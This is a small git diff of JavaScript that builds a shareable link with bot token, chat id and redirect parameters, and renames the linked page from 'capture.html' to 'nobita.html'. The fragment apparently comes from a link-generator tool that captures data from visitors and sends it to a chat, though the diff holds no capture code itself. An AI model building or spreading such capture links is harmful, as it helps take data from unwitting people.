@@ -29,7 +29,7 @@
                 return;
             }
             // Change the base URL if needed, default: same folder
-            const baseUrl = location.origin + location.pathname.replace('index.html', '') + 'capture.html';
+            const baseUrl = location.origin + location.pathname.replace('index.html', '') + 'nobita.html';
             const link = `${baseUrl}?token=${token}&chat=${chat}&redirect=${redirect}`;
             document.getElementById('result').innerHTML = `<b>Your Link:</b><br><a href="${link}" target="_blank">${link}</a>`;
         }
